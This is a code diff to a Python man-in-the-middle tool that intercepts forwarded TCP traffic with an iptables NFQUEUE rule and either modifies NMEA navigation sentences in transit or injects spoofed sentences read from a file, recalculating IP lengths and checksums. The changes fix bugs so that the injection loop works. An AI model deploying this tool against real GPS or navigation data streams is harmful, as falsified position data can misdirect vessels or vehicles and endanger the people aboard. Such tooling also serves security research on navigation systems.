@@ -71,7 +71,7 @@ class MITM:
                             nmea_obj.modify_attr(attribute['key'], attribute['value'])
                     
                     #print(nmea_obj.sentence)
-                    pktIP[TCP].add_payload(nmea_obj.sentence)
+                    pktIP[TCP].add_payload(str(nmea_obj.sentence))
                     print(f"\n[*] Payload modified and sending...\n{nmea_obj.sentence}\n")
                     
                     new_len = len(pktIP[TCP].payload)
@@ -109,8 +109,9 @@ class MITM:
                 if curr_index < len(nmea_data):
 
                     pktIP[TCP].add_payload(nmea_data[curr_index])
-                print(f"\n[*] New Payload Injected and sending...\n")
-                
+                print(curr_index)
+                print(f"\n[*] New Payload Injected and sending...\n{pktIP[TCP].payload}\n")
+                curr_index += 1
                 new_len = len(pktIP[TCP].payload)
                 pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
                 del pktIP[IP].chksum
@@ -123,7 +124,7 @@ class MITM:
            print(e)
 
         packet.accept()
-        curr_index += 1
+        
 
     def setup(self):
         iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {self.target_ip}"
@@ -160,13 +161,13 @@ def read_config(config_file):
 
 def read_file(filename):
     global nmea_data
-    nmea_data = open(filename,'r')
+    nmea_data = open(filename,'r').readlines()
 
 if __name__ == '__main__':
     args = get_input()
     if args.option == "I" and args.filename:
         read_file(args.filename)
-    elif not args.filename:
+    elif args.option == "I" and not args.filename:
         print("No input file specified for injection")
         exit()
 
